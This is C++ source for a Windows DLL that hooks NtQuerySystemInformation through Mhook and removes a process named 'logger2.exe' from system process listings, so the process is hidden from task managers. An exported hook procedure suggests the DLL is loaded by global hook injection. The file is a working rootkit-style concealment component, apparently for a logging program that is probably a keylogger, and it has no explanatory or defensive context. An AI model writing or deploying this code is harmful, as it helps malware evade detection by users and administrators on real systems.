#include "hideProcess.h"
HINSTANCE hInstance;


PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
(PNT_QUERY_SYSTEM_INFORMATION)::GetProcAddress(::GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");

NTSTATUS WINAPI HookedNtQuerySystemInformation(
	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout    PVOID                    SystemInformation,
	__in       ULONG                    SystemInformationLength,
	__out_opt  PULONG                   ReturnLength
)
{
	NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);
	
	ODPRINTF(("TARARAM"));

	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
	{
		//
		// Loop through the list of processes
		//

		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

		do
		{
			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

			if (!wcsncmp(pNext->ImageName.Buffer, L"logger2.exe", pNext->ImageName.Length))
			{
				if (0 == pNext->NextEntryOffset)
				{
					pCurrent->NextEntryOffset = 0;
				}
				else
				{
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				}

				pNext = pCurrent;
			}
		} while (pCurrent->NextEntryOffset != 0);
	}

	return status;
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID lpReserved) {
	if (reason == DLL_PROCESS_ATTACH) {
		Mhook_SetHook((PVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
	}
	else if (reason == DLL_PROCESS_DETACH) {
		Mhook_Unhook((PVOID*)&OriginalNtQuerySystemInformation);
	}
	else if (reason == DLL_THREAD_ATTACH) {

	}
	return TRUE;
}

MYHOOKDLL_API LRESULT WINAPI emptyProc(int code, WPARAM wParam, LPARAM lParam) {
	return CallNextHookEx(NULL, code, wParam, lParam);
}